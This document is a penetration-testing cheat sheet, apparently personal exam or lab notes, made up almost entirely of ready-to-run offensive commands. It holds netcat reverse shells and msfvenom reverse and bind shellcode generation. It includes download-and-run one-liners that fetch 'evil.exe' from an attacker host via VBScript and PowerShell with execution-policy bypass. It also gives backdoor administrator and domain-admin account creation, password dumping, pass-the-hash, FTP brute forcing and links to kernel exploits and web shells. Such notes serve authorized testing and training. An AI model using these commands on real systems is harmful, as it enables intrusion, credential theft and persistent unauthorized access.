# Tips PT RT

## Reverse shell

```bash
nc -nv 10.0.0.22 4444 -e /bin/bash
```

```bash
ncat --exec cmd.exe
```

https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/

## Enumeration

### nmap
nmap IP -sT

nmap IP --script smb-os-discovery

nmap IP --script smb-*

nmap -sU --open -p 161 IP

Preferred
```
nmap IP -sC -oA nmap-sc
nmap IP -sC -pPORTE -sV -A -oA nmap-sc-sv-a
nmap IP -sC -pPORTE -sV --script=vuln -oA nmap-sc-sv-vuln
nmap IP -p- -sC -oA nmap-allp-sc
```
then some UDP
### nbtscan
nbtscan -r IP

### enum4linux
enum4linux -a IP

### smbclient

#### example with creds

smbclient -A credentials.txt //10.123.42.144/Doc

where credentials.txt is:
```bash
username = <value>
password = <value>
domain   = <value>
```


```bash
echo public > community
echo private >> community
echo manager >> community
onesixtyone -c community IP
```


# Checks

* 21/tcp
	* ftp anonymous
		* download/upload+rev-shell
	* ftp brufeforce
		* nmap --script ftp-brute -p 21 IP
		* hydra -t 1 -L wordlist-user -P wordlist-pass -vV IP ftp
		* https://github.com/arjnklc/FTP-Brute-Forcer/blob/master/ftp_brute_forcer.py
* 80/tcp, 443/tcp, web
	* dirb - subpaths, files
	* nikto - vuln, paths
	* cewl - wordlist 

* 139/tcp, 445/tcp
	* smb-security

# Shellcode generation
## windows reverse shell - exploitation - 32 bit
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

## windows reverse shell - exploitation - 32 bit exit as a thread
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

## linux bind shell - exploitation - 32 bit
```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=PORT -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
```


# Cross compilation
## mingw-w64 
https://www.systutorials.com/docs/linux/man/1-i686-w64-mingw32-gcc/
```bash
 i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe

```

# File transfer

https://blog.ropnop.com/transferring-files-from-kali-to-windows/

## TFTP
Server
```bash
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/

```
Client
```bash
tftp -i SERVER-IP get nc.exe
```

## FTP
```bash
apt-get update && apt-get install pure-ftpd
```
Create a new user for the ftp server
```bash
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
Run the script
```bash
chmod 755 setup-ftp
./setup-ftp
```

Windows commands for connection
```cmd
echo open 10.11.0.5 21> ftp.txt
echo USER offsec>> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

## Scripting languages
### VBScript
```cmd
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
Execution
```cmd
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

### Powershell
```powershell
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
Execution
```cmd
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```
### Debug.exe
for 32 bit systems, with 64k byte size limit for file creation
```
upx -9 nc.exe 
wine exe2bat.exe nc.exe nc.txt
```
todo

## Privilege escalation - Generic
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite 
-> linpeas
-> winpeas

## SMB RELAY - Windows

https://intrinium.com/smb-relay-attack-tutorial/

https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html


## Privilege escalation - Windows


Adding persistence:
```
net user hacker Hacker123! /add

net localgroup administrators hacker /add

net localgroup "Remote Desktop Users" hacker /add



# WINDOWS: Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# WINDOWS: Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD
```
## Verify missing patch
https://github.com/rasta-mouse/Sherlock.git

### Exploits
* MS11-080 - Windows XP, Windows 2003 Adf.sys 
	* http://www.exploit-db.com/exploits/18176/ MS11-080
		* ``` python pyinstaller.py --onefile ms11-080.py ```
### Misconfiguration
* icalcs
	* detects insecure permissions
		* ```icalcs binary-name.exe```
```C 
// file useradd.c
#include <stdlib.h>
 /* system, NULL, EXIT_FAILURE */
int main ()
{
	int i;
	i = system ("net localgroup administrators low /add");
	return 0;
}
```
		* ```i686-w64-mingw32-gcc -o filename.exe useradd.c ```
* fgdump.exe / pwdump.exe
	* A utility for dumping passwords on Windows NT/2000/XP/2003 machines 
	* https://github.com/interference-security/kali-windows-binaries/tree/master/fgdump
* Windows Credential Editor (WCE)
	* obtain cleartext passwords and hashes from a compromised Windows host
	* ``` wce_protected.exe –w ```
* pass the hash
https://pen-testing.sans.org/resources/papers/gcih/pass-the-hash-windows-10-174913
```bash  
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U administrator% //10.11.01.76 cmd
```
* Windows Group Policy Preferences
```cmd
net use z: \\dc01\SYSVOL
dir /s Groups.xml
copy Z:\DOMAIN-NAME-TO-CHANGE\Policies\{...}\Machine\Preferences\Groups\Groups.xml C:\Users\mike.DOMAIN-NAME-TO-CHANGE\Documents
type A Groups.xml
```
```bash
gpp-decrypt
```


## Privilege escalation - Linux
* Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64-bit (Ubuntu 11.10, 32 bit CVE 2012-0056)
	* http://www.exploit-db.com/download/18411 Mempodipper
* Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation
	* https://www.exploit-db.com/exploits/3

## Redis
http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html



## Complete Interactive Reverse Shell
https://innogen-security.com/linux-tty-shell-using-script/

## Web shell php,asp,aspx
https://github.com/grCod/webshells/tree/master/webshells


## Misc Bof
badchars
```
BAD_CHARS +=b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f'
BAD_CHARS +=b'\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f'
BAD_CHARS +=b'\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f'
BAD_CHARS +=b'\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f'
BAD_CHARS +=b'\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f'
BAD_CHARS +=b'\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f'
BAD_CHARS +=b'\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f'
BAD_CHARS +=b'\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f'
BAD_CHARS +=b'\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f'
BAD_CHARS +=b'\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f'
BAD_CHARS +=b'\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf'
BAD_CHARS +=b'\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf'
BAD_CHARS +=b'\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf'
BAD_CHARS +=b'\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf'
BAD_CHARS +=b'\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef'
BAD_CHARS +=b'\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
```

https://medium.com/@johntroony/a-practical-overview-of-stack-based-buffer-overflow-7572eaaa4982

###TIP: 

If you can't listen on port 80 during a bind shell, try adding the URI '/Temporary_Listen_Address/' to ur listener. Magic! You don't need administrative privileges to listen on port 80 on Windows anymore  https://twitter.com/NinjaParanoid/status/1265187842889744384
